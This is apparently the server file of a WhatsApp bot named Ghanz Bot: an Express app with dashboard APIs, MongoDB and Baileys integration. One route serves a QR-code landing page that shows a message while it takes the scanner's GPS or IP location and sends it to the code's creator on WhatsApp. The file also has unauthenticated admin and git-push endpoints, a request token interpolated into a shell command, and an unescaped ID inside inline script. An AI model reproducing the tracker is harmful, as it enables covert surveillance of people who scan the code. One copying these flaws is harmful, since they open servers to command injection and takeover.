/**
 * Full-Stack Express Server & Bot Controller
 * Integrates Vite middleware, Baileys socket, MongoDB, and REST APIs.
 */

import express from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';
import { config, isOwnerNumber } from './bot/config.ts';
import { connectDB, getMongoStatus } from './bot/database/mongo.ts';
import { startBaileysBot, getBotState, requestPairingCodeDirectly, getSockInstance } from './bot/lib/baileys.ts';
import {
  getQrLocationRecord,
  addScanLogToQrLocation,
  getQrLocationsByCreator
} from './bot/database/models/QrLocation.ts';
import { getAllCommands, getCommandsByCategory, getTotalCommandsCount } from './bot/commands/index.ts';
import { handleIncomingMessage } from './bot/lib/handler.ts';
import {
  getAllMemoryUsers,
  addPersistentPremiumNumber,
  removePersistentPremiumNumber,
  getPersistentPremiumNumbers,
  getScannedUsers,
  scanAndVerifyNumber,
  getPersistentOwnerNumbers,
  addPersistentOwnerNumber,
  addPersistent18User,
  removePersistent18User,
  getPersistent18Users
} from './bot/database/models/User.ts';
import {
  getGroup,
  getAllMemoryGroups,
  getApproved18GroupsList,
  getPending18RequestsList,
  requestGroup18,
  approveGroup18,
  revokeGroup18
} from './bot/database/models/Group.ts';
import { getCommandStats7Days } from './bot/lib/commandStats.ts';
import { getLiteDashboardHtml } from './bot/lib/liteDashboard.ts';
import { saveQrisImageToDB, getQrisImageFromDB } from './bot/database/models/QrisSettings.ts';
import { exec } from 'child_process';
import util from 'util';
import { createRequire } from 'module';

// Safely provide require for both ESM and CJS bundle
// @ts-ignore
const nodeRequire = typeof require !== 'undefined' ? require : createRequire(typeof import.meta !== 'undefined' && import.meta.url ? import.meta.url : 'file://' + process.cwd() + '/server.ts');
const archiver = nodeRequire('archiver');

const execAsync = util.promisify(exec);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json({ limit: '100mb' }));
  app.use(express.urlencoded({ limit: '100mb', extended: true }));

  // Connect to database
  await connectDB();

  // Initialize Baileys socket in background
  const pairArg = process.argv.find(a => a.startsWith('--pair='))?.split('=')[1] || process.env.PAIR_PHONE;
  if (pairArg) {
    console.log(`\n⏳ Sedang meminta Kode Pairing untuk nomor: ${pairArg}...`);
  }
  startBaileysBot(pairArg).catch((err) => {
    console.warn('[SERVER] Baileys initial start notice:', err.message);
  });

  // --- REST API ROUTES ---

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
  });

  // Bot & System Status
  app.get('/api/status', (req, res) => {
    const bot = getBotState();
    const mongo = getMongoStatus();
    const memory = process.memoryUsage();

    res.json({
      bot,
      mongo,
      system: {
        uptime: process.uptime(),
        memory: {
          rss: Math.round(memory.rss / 1024 / 1024),
          heapUsed: Math.round(memory.heapUsed / 1024 / 1024),
          heapTotal: Math.round(memory.heapTotal / 1024 / 1024)
        },
        nodeVersion: process.version,
        platform: process.platform
      },
      totalCommands: getTotalCommandsCount()
    });
  });

  // QR Code & Pairing Status
  app.get('/api/qr', (req, res) => {
    const state = getBotState();
    res.json({
      status: state.status,
      qr: state.qrCodeUrl,
      pairingCode: state.pairingCode,
      lastConnected: state.lastConnected,
      error: state.errorMessage
    });
  });

  // Request Pairing Code
  app.post('/api/pair', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({ error: 'Nomor telepon WhatsApp diperlukan' });
    }
    try {
      const code = await requestPairingCodeDirectly(phoneNumber);
      const formatted = code ? (code.match(/.{1,4}/g)?.join('-') || code) : code;
      res.json({ success: true, code: formatted, rawCode: code, message: 'Kode pairing berhasil dibuat!' });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // --- QR LOCATION REAL-TIME TRACKING ROUTES ---

  // Web page rendered when QR Code is scanned
  app.get('/qrlok/:qrId', async (req, res) => {
    const { qrId } = req.params;
    const record = await getQrLocationRecord(qrId);

    if (!record) {
      return res.status(404).send(`
        <!DOCTYPE html>
        <html lang="id">
        <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>QR Code Tidak Ditemukan</title><script src="https://cdn.tailwindcss.com"></script></head>
        <body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center p-4">
          <div class="max-w-md w-full bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4">
            <div class="text-4xl">⚠️</div>
            <h1 class="text-xl font-bold text-red-400">QR Code Tidak Ditemukan / Kedaluwarsa</h1>
            <p class="text-xs text-slate-400">Kode QR ini mungkin telah dihapus atau ID tidak valid.</p>
          </div>
        </body>
        </html>
      `);
    }

    const safeMessage = record.message.replace(/</g, '&lt;').replace(/>/g, '&gt;');

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(`
      <!DOCTYPE html>
      <html lang="id">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>${safeMessage}</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
        <style>body { font-family: 'Plus Jakarta Sans', sans-serif; }</style>
      </head>
      <body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-center p-4">
        <div class="max-w-md w-full bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl text-center space-y-6 relative overflow-hidden">
          <div class="absolute -top-12 -right-12 w-32 h-32 bg-emerald-500/10 rounded-full blur-2xl"></div>
          <div class="absolute -bottom-12 -left-12 w-32 h-32 bg-blue-500/10 rounded-full blur-2xl"></div>

          <div class="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-tr from-emerald-500 to-teal-400 rounded-2xl shadow-lg shadow-emerald-500/20 text-slate-950 font-bold text-2xl">
            💬
          </div>

          <div>
            <p class="text-xs font-semibold uppercase tracking-wider text-emerald-400 mb-1">Pesan Terlampir</p>
            <h1 class="text-2xl font-extrabold text-white leading-tight break-words">${safeMessage}</h1>
          </div>

          <div id="statusBox" class="p-4 rounded-2xl bg-slate-800/60 border border-slate-700/50 text-xs text-slate-300 flex items-center justify-center gap-2">
            <div id="spinner" class="w-3 h-3 border-2 border-emerald-400 border-t-transparent rounded-full animate-spin"></div>
            <span id="statusText">Verifikasi lokasi real-time...</span>
          </div>

          <div id="locationInfo" class="hidden p-4 rounded-2xl bg-emerald-950/40 border border-emerald-800/40 text-emerald-300 text-xs text-left space-y-2">
            <p class="font-bold text-emerald-400 flex items-center gap-1">📍 Lokasi Terekam di Database:</p>
            <p id="latLngText" class="font-mono text-slate-200"></p>
            <a id="mapsBtn" target="_blank" rel="noopener noreferrer" class="inline-block mt-2 px-3 py-2 bg-emerald-500 text-slate-950 font-semibold rounded-xl hover:bg-emerald-400 transition text-center w-full shadow-md">🗺️ Buka di Google Maps</a>
          </div>

          <p class="text-[10px] text-slate-500">Powered by Ghanz Bot Multi-Device Security System</p>
        </div>

        <script>
          (function() {
            const qrId = "${qrId}";
            const statusText = document.getElementById('statusText');
            const statusBox = document.getElementById('statusBox');
            const spinner = document.getElementById('spinner');
            const locationInfo = document.getElementById('locationInfo');
            const latLngText = document.getElementById('latLngText');
            const mapsBtn = document.getElementById('mapsBtn');

            function sendLocation(lat, lng, accuracy, source) {
              fetch('/api/qrlok/' + qrId + '/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  latitude: lat,
                  longitude: lng,
                  accuracy: accuracy || 0,
                  source: source || 'GPS'
                })
              })
              .then(r => r.json())
              .then(data => {
                spinner.style.display = 'none';
                statusBox.className = 'p-3 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-xs text-emerald-400 font-semibold';
                statusText.textContent = '✅ Lokasi real-time berhasil tersimpan di database!';
                
                if (lat && lng) {
                  locationInfo.classList.remove('hidden');
                  latLngText.textContent = 'Koordinat: ' + lat.toFixed(5) + ', ' + lng.toFixed(5);
                  mapsBtn.href = 'https://maps.google.com/?q=' + lat + ',' + lng;
                }
              })
              .catch(err => {
                spinner.style.display = 'none';
                statusText.textContent = '✅ Pesan berhasil dimuat.';
              });
            }

            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(
                function(pos) {
                  sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'GPS');
                },
                function(err) {
                  fetch('https://ipapi.co/json/')
                    .then(r => r.json())
                    .then(ipData => {
                      if (ipData.latitude && ipData.longitude) {
                        sendLocation(ipData.latitude, ipData.longitude, 1000, 'IP');
                      } else {
                        sendLocation(0, 0, 0, 'IP');
                      }
                    })
                    .catch(() => sendLocation(0, 0, 0, 'UNKNOWN'));
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
              );
            } else {
              fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(ipData => sendLocation(ipData.latitude || 0, ipData.longitude || 0, 1000, 'IP'))
                .catch(() => sendLocation(0, 0, 0, 'UNKNOWN'));
            }
          })();
        </script>
      </body>
      </html>
    `);
  });

  // Location tracking endpoint when scan happens
  app.post('/api/qrlok/:qrId/track', async (req, res) => {
    const { qrId } = req.params;
    const { latitude, longitude, accuracy } = req.body;
    const clientIp = (req.headers['x-forwarded-for'] as string)?.split(',')[0] || req.socket.remoteAddress || '127.0.0.1';
    const userAgent = req.headers['user-agent'] || 'Unknown Browser';

    const lat = Number(latitude) || 0;
    const lng = Number(longitude) || 0;
    const mapsUrl = (lat && lng) ? `https://maps.google.com/?q=${lat},${lng}` : '';

    const scanData = {
      timestamp: new Date(),
      ip: clientIp,
      userAgent,
      latitude: lat,
      longitude: lng,
      accuracy: Number(accuracy) || 0,
      googleMapsUrl: mapsUrl
    };

    const updatedDoc = await addScanLogToQrLocation(qrId, scanData);

    if (!updatedDoc) {
      return res.status(404).json({ error: 'QR Code not found' });
    }

    // Notify creator on WhatsApp if Baileys socket is connected!
    try {
      const sock = getSockInstance();
      if (sock && updatedDoc.creatorJid) {
        const notifText =
          `🔔 *LOKASI QR CODE TEREKAM DILACAK!* 📍\n\n` +
          `• 💬 *Pesan QR:* "${updatedDoc.message}"\n` +
          `• ⏱️ *Waktu:* ${new Date().toLocaleString('id-ID')}\n` +
          `• 📍 *Koordinat:* ${lat ? `${lat}, ${lng}` : 'Terdeteksi dari IP'}\n` +
          (mapsUrl ? `• 🗺️ *Google Maps:* ${mapsUrl}\n` : '') +
          `• 🌐 *IP:* ${clientIp}\n` +
          `• 📱 *Perangkat:* ${userAgent.slice(0, 40)}...\n\n` +
          `_Data lokasi penye-scan telah disimpan di Database!_`;

        await sock.sendMessage(updatedDoc.creatorJid, { text: notifText });
      }
    } catch (err: any) {
      console.warn('[QrLocation] WhatsApp notification error:', err.message);
    }

    res.json({ success: true, message: 'Location saved to database', mapsUrl });
  });

  // All Commands Catalog
  app.get('/api/commands', (req, res) => {
    const grouped = getCommandsByCategory();
    const all = getAllCommands();
    res.json({
      total: all.length,
      categories: Object.keys(grouped),
      grouped,
      list: all.map(c => ({
        name: c.name,
        aliases: c.aliases || [],
        category: c.category,
        description: c.description,
        usage: c.usage || `.${c.name}`,
        limitCost: c.limitCost || 0,
        premiumOnly: Boolean(c.premiumOnly),
        ownerOnly: Boolean(c.ownerOnly),
        groupOnly: Boolean(c.groupOnly),
        adminOnly: Boolean(c.adminOnly)
      }))
    });
  });

  // Live Simulator: test commands directly via web console with accurate number scanning
  app.post('/api/simulate', async (req, res) => {
    const { command, senderNumber, senderName } = req.body;
    if (!command) {
      return res.status(400).json({ error: 'Command text is required' });
    }

    const rawNum = senderNumber || config.ownerNumber;
    const cleanDigits = rawNum.replace(/\D/g, '') || config.ownerNumber;
    const testJid = `${cleanDigits}@s.whatsapp.net`;
    const isOwner = isOwnerNumber(cleanDigits);
    const resolvedSenderName = senderName || (isOwner ? config.ownerName : 'User');
    let replyCaptured = '';
    let reactCaptured = '';
    let imageCaptured: string | null = null;

    const result = await handleIncomingMessage({
      senderJid: testJid,
      senderName: resolvedSenderName,
      body: command.startsWith(config.prefix) ? command : `${config.prefix}${command}`,
      isGroupAdmin: false,
      sendReply: async (text: string) => {
        replyCaptured = text;
        return text;
      },
      sendReaction: async (emoji: string) => {
        reactCaptured = emoji;
      },
      sendImage: async (imageUrlOrBuffer: string | Buffer, caption?: string) => {
        if (caption) replyCaptured = caption;
        if (typeof imageUrlOrBuffer === 'string') {
          imageCaptured = imageUrlOrBuffer;
        } else if (Buffer.isBuffer(imageUrlOrBuffer)) {
          imageCaptured = `data:image/jpeg;base64,${imageUrlOrBuffer.toString('base64')}`;
        }
        return { image: true };
      }
    });

    res.json({
      executed: result.executed,
      reply: replyCaptured || result.replyText || 'Perintah dijalankan tanpa pesan balasan teks.',
      reaction: reactCaptured,
      image: imageCaptured,
      error: result.error
    });
  });

  // Database Users Stats
  app.get('/api/users', (req, res) => {
    const users = getAllMemoryUsers();
    res.json({
      count: users.length,
      users: users.slice(0, 50).map(u => ({
        id: u.id,
        name: u.name,
        level: u.level,
        koin: u.koin,
        limit: u.limit,
        role: u.role,
        premium: u.premium
      }))
    });
  });

  // Get list of auto-premium numbers
  app.get('/api/premium-numbers', (req, res) => {
    const list = getPersistentPremiumNumbers();
    res.json({ count: list.length, numbers: list });
  });

  // Add auto-premium number
  app.post('/api/premium-numbers', (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({ error: 'Nomor telepon diperlukan' });
    }
    const result = addPersistentPremiumNumber(phoneNumber);
    if (!result.success) {
      return res.status(400).json({ error: 'Nomor tidak valid' });
    }
    res.json({
      success: true,
      number: result.cleanNumber,
      message: `Nomor ${result.cleanNumber} berhasil disimpan sebagai Auto-Premium! Kapan pun nomor ini ngechat, statusnya otomatis Premium VIP.`
    });
  });

  // Delete auto-premium number
  app.delete('/api/premium-numbers', (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({ error: 'Nomor telepon diperlukan' });
    }
    const result = removePersistentPremiumNumber(phoneNumber);
    res.json({
      success: true,
      number: result.cleanNumber,
      message: `Nomor ${result.cleanNumber} berhasil dihapus dari Auto-Premium.`
    });
  });

  // Get list of users who scanned QR code / logged into WA Web
  app.get('/api/scanned-users', (req, res) => {
    const list = getScannedUsers();
    res.json({ count: list.length, users: list });
  });

  // Command usage statistics for Recharts / D3 dashboard
  app.get('/api/command-stats', (req, res) => {
    const stats = getCommandStats7Days();
    res.json(stats);
  });

  // Get and add owner numbers
  app.get('/api/owners', (req, res) => {
    const list = getPersistentOwnerNumbers();
    res.json({ count: list.length, owners: list });
  });

  app.post('/api/owners', (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) return res.status(400).json({ error: 'Nomor telepon diperlukan' });
    const result = addPersistentOwnerNumber(phoneNumber);
    if (!result.success) return res.status(400).json({ error: 'Nomor tidak valid' });
    res.json({ success: true, number: result.cleanNumber, message: `Nomor ${result.cleanNumber} berhasil ditambahkan sebagai Owner bot!` });
  });

  // --- 18+ GROUP APPROVALS & PERMISSIONS API ---
  app.get('/api/18plus-requests', (req, res) => {
    const pendingList = getPending18RequestsList();
    const approvedJids = getApproved18GroupsList();
    const all = getAllMemoryGroups();

    // Map approved groups
    const approvedMap = new Map<string, any>();
    for (const g of all) {
      if (g.ownerApproved18 || approvedJids.includes(g.id)) {
        approvedMap.set(g.id, {
          id: g.id,
          name: g.name || 'WhatsApp Group',
          approvedBy: g.ownerApprovedBy || 'Owner',
          approvedAt: g.ownerApprovedAt
        });
      }
    }
    for (const jid of approvedJids) {
      if (!approvedMap.has(jid)) {
        approvedMap.set(jid, {
          id: jid,
          name: 'WhatsApp Group',
          approvedBy: 'Owner',
          approvedAt: null
        });
      }
    }

    const approved = Array.from(approvedMap.values());

    res.json({
      totalGroups: all.length,
      pendingCount: pendingList.length,
      approvedCount: approved.length,
      pending: pendingList,
      approved: approved,
      approvedJids,
      allGroups: all.map(g => ({
        id: g.id,
        name: g.name,
        ownerApproved18: Boolean(g.ownerApproved18),
        nsfwEnabled: Boolean(g.nsfwEnabled),
        ageConsentAccepted: Boolean(g.ageConsentAccepted)
      }))
    });
  });

  // Direct Gallery Image Upload Endpoint for Donasi / QRIS
  app.post('/api/upload-qris', express.json({ limit: '100mb' }), async (req, res) => {
    try {
      const { imageBase64 } = req.body;
      if (!imageBase64) {
        return res.status(400).json({ error: 'Data gambar base64 tidak ditemukan' });
      }

      const success = await saveQrisImageToDB(imageBase64, 'image/jpeg', 'Web Gallery Upload');

      if (success) {
        console.log(`[QRIS Upload] Gambar dari galeri berhasil disimpan ke MongoDB & Disk`);
        return res.json({
          success: true,
          message: 'Gambar QRIS dari galeri berhasil disimpan permanen ke database!'
        });
      } else {
        return res.status(500).json({ error: 'Gagal menyimpan gambar ke database' });
      }
    } catch (err: any) {
      console.error('[QRIS Upload Error]:', err.message);
      return res.status(500).json({ error: `Gagal menyimpan gambar dari galeri: ${err.message}` });
    }
  });

  // GET Endpoint to retrieve saved QRIS image from Database
  app.get('/api/qris-image', async (req, res) => {
    try {
      const qrisData = await getQrisImageFromDB();
      if (!qrisData || !qrisData.buffer) {
        return res.status(444).send('Gambar QRIS belum tersedia.');
      }
      res.setHeader('Content-Type', qrisData.mimeType || 'image/jpeg');
      return res.send(qrisData.buffer);
    } catch (err: any) {
      return res.status(500).send('Error loading QRIS image');
    }
  });

  app.post('/api/18plus-requests/request', async (req, res) => {
    const { groupId, groupName, requestedBy, reason } = req.body;
    if (!groupId) {
      return res.status(400).json({ error: 'ID/JID Grup diperlukan' });
    }

    const reqObj = await requestGroup18(groupId, groupName, requestedBy, reason);
    res.json({
      success: true,
      request: reqObj,
      message: `Permohonan 18+ untuk ${reqObj.name} (${reqObj.id}) berhasil dikirim & disimpan!`
    });
  });

  app.post('/api/18plus-requests/acc', async (req, res) => {
    const { groupId, targetId } = req.body;
    const target = groupId || targetId;
    if (!target) {
      return res.status(400).json({ error: 'ID/JID Grup atau Nomor User diperlukan' });
    }

    const cleanTarget = String(target).trim();
    const isGroup = cleanTarget.includes('@g.us') || cleanTarget.startsWith('120363');

    if (isGroup) {
      const cleanJid = cleanTarget.includes('@') ? cleanTarget : `${cleanTarget}@g.us`;
      const group = await approveGroup18(cleanJid, 'Web Dashboard Owner');

      try {
        const sock = getSockInstance();
        if (sock && sock.sendMessage) {
          await sock.sendMessage(cleanJid, {
            text: `✅ *PERSETUJUAN FOTO 18+ DI-ACC DARI WEB DASHBOARD OWNER*\n\n` +
                  `Grup (*${group.name || 'Grup'}*) telah secara resmi disetujui oleh Owner via Web Control Panel.\n` +
                  `Anggota grup sekarang dapat menggunakan perintah *.anime18 <prompt>* atau *.waifu18*.`
          });
        }
      } catch (e: any) {
        console.warn('[Server] Failed to notify group via WA:', e.message);
      }

      return res.json({
        success: true,
        groupId: cleanJid,
        groupName: group.name,
        message: `Akses 18+ untuk grup ${group.name || cleanJid} BERHASIL DI-ACC & TERSIMPAN DI DATABASE!`
      });
    } else {
      const userRes = addPersistent18User(cleanTarget);
      return res.json({
        success: true,
        number: userRes.cleanNumber,
        message: `Akses 18+ untuk nomor +${userRes.cleanNumber} BERHASIL DI-ACC & TERSIMPAN DI DATABASE!`
      });
    }
  });

  app.post('/api/18plus-requests/reject', async (req, res) => {
    const { groupId, targetId } = req.body;
    const target = groupId || targetId;
    if (!target) {
      return res.status(400).json({ error: 'ID/JID Grup atau Nomor User diperlukan' });
    }

    const cleanTarget = String(target).trim();
    const isGroup = cleanTarget.includes('@g.us') || cleanTarget.startsWith('120363');

    if (isGroup) {
      const cleanJid = cleanTarget.includes('@') ? cleanTarget : `${cleanTarget}@g.us`;
      const group = await revokeGroup18(cleanJid);

      try {
        const sock = getSockInstance();
        if (sock && sock.sendMessage) {
          await sock.sendMessage(cleanJid, {
            text: `🚫 *AKSES FOTO 18+ DICABUT DARI WEB DASHBOARD OWNER*\n\n` +
                  `Akses pembuatan foto 18+ untuk grup ini telah dikunci/ditolak kembali oleh Owner.`
          });
        }
      } catch (e: any) {
        console.warn('[Server] Failed to notify group via WA:', e.message);
      }

      return res.json({
        success: true,
        groupId: cleanJid,
        groupName: group.name,
        message: `Akses 18+ untuk grup ${group.name || cleanJid} BERHASIL DICABUT/DITOLAK.`
      });
    } else {
      const userRes = removePersistent18User(cleanTarget);
      return res.json({
        success: true,
        number: userRes.cleanNumber,
        message: `Akses 18+ untuk nomor +${userRes.cleanNumber} BERHASIL DICABUT DARI DATABASE.`
      });
    }
  });

  // Live Scan & Verify Number against Database (same logic as .profile / .me)
  app.post('/api/scan-number', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({ error: 'Nomor telepon diperlukan' });
    }
    try {
      const result = await scanAndVerifyNumber(phoneNumber);
      res.json({
        success: true,
        scan: {
          number: result.cleanNumber,
          formattedPhone: result.formattedPhone,
          jid: result.cleanJid,
          lid: result.lid,
          isLid: result.isLid,
          matchedType: result.matchedType,
          statusLabel: result.statusLabel,
          verificationDetail: result.verificationDetail,
          synchronizationMessage: result.synchronizationMessage,
          user: {
            name: result.user.name,
            role: result.user.role,
            premium: result.user.premium,
            limit: result.user.limit,
            koin: result.user.koin,
            level: result.user.level,
            registered: result.user.registered
          }
        }
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // Download entire repository as clean .ZIP file directly from phone
  app.get('/api/download-zip', (req, res) => {
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', 'attachment; filename="ghanz-bot-md.zip"');

    const archiverPkg = nodeRequire('archiver');
    const archive = typeof archiverPkg === 'function'
      ? archiverPkg('zip', { zlib: { level: 9 } })
      : new archiverPkg.ZipArchive({ zlib: { level: 9 } });

    archive.on('error', (err: any) => {
      console.error('[ZIP ERROR]', err);
    });

    archive.pipe(res);

    archive.glob('**/*', {
      cwd: process.cwd(),
      ignore: ['node_modules/**', '.git/**', 'dist/**', 'sessions/**']
    });

    archive.finalize();
  });

  // Git Repository & Push Status
  app.get('/api/git/status', async (req, res) => {
    try {
      const { stdout: statusOut } = await execAsync('git status -s || echo "Not a repo"');
      const { stdout: logOut } = await execAsync('git log -n 10 --oneline || echo "No commits"');
      const { stdout: remoteOut } = await execAsync('git remote -v || echo "No remotes"');

      res.json({
        repoUrl: config.githubRepo,
        status: statusOut.trim(),
        recentCommits: logOut.trim().split('\n').filter(Boolean),
        remotes: remoteOut.trim(),
        hasToken: Boolean(config.githubToken || process.env.GITHUB_TOKEN)
      });
    } catch (err: any) {
      res.json({
        repoUrl: config.githubRepo,
        status: 'Uninitialized',
        recentCommits: [],
        remotes: '',
        error: err.message
      });
    }
  });

  // Git Push Action (Uses token if provided in request or env)
  app.post('/api/git/push', async (req, res) => {
    const token = req.body.token || config.githubToken || process.env.GITHUB_TOKEN;
    if (!token) {
      return res.status(400).json({
        error: 'GitHub Personal Access Token (PAT) diperlukan untuk push ke https://github.com/GhanzStudio/bot'
      });
    }

    try {
      // Configure git credentials helper with token
      const authUrl = `https://${token}@github.com/GhanzStudio/bot.git`;
      await execAsync(`git remote set-url origin "${authUrl}" || git remote add origin "${authUrl}"`);
      const { stdout } = await execAsync('git push -u origin main --force');
      res.json({ success: true, message: 'Berhasil push ke GitHub repository!', output: stdout });
    } catch (err: any) {
      res.status(500).json({ error: `Gagal push: ${err.message}` });
    }
  });

  // --- Lite Web Dashboard for Ultra-Fast Mobile & Termux Experience ---
  app.get('/lite', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(getLiteDashboardHtml());
  });

  app.get('/pair-web', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(getLiteDashboardHtml());
  });

  // --- Vite & Frontend Integration ---
  const distDir = path.join(process.cwd(), 'dist');
  const docsDir = path.join(process.cwd(), 'docs');

  const staticDir = fs.existsSync(path.join(distDir, 'index.html'))
    ? distDir
    : (fs.existsSync(path.join(docsDir, 'index.html')) ? docsDir : null);

  const hasStatic = staticDir !== null;

  // Detect Android/Termux or production environment to serve precompiled lightweight bundle
  const isAndroidOrTermux = process.platform === 'android' || 
    Boolean(process.env.TERMUX_VERSION) || 
    Boolean(process.env.PREFIX && process.env.PREFIX.includes('termux')) ||
    process.env.SERVE_STATIC === 'true' ||
    process.argv.includes('--static');

  if (process.env.NODE_ENV !== 'production' && !isAndroidOrTermux) {
    const vite = await createViteServer({
      server: {
        middlewareMode: true,
        hmr: false,
        ws: false,
      },
      appType: 'spa',
    });
    app.use(vite.middlewares);

    // Explicitly handle SPA route fallback in dev
    app.use('*', async (req, res, next) => {
      const url = req.originalUrl;
      try {
        let template = fs.readFileSync(path.resolve(process.cwd(), 'index.html'), 'utf-8');
        template = await vite.transformIndexHtml(url, template);
        res.status(200).set({ 'Content-Type': 'text/html' }).end(template);
      } catch (e: any) {
        vite.ssrFixStacktrace(e);
        next(e);
      }
    });
  } else if (hasStatic) {
    console.log(`⚡ Dashboard mode: Melayani aset web pra-kompilasi dari ${path.basename(staticDir!)}/ (cepat, hemat RAM & anti layar putih)`);
    app.use(express.static(staticDir!));
    app.get('*', (req, res) => {
      res.sendFile(path.join(staticDir!, 'index.html'));
    });
  } else {
    // Zero-dependency fallback if static build doesn't exist
    console.log('⚡ Dashboard mode: Melayani Lite Web Controller (zero-dependency fallback)');
    app.get('*', (req, res) => {
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      res.send(getLiteDashboardHtml());
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Web Dashboard & Bot Controller berjalan di port ${PORT}`);
    console.log(`📱 Buka di Chrome: http://localhost:${PORT} atau http://127.0.0.1:${PORT}`);
  });
}

startServer();
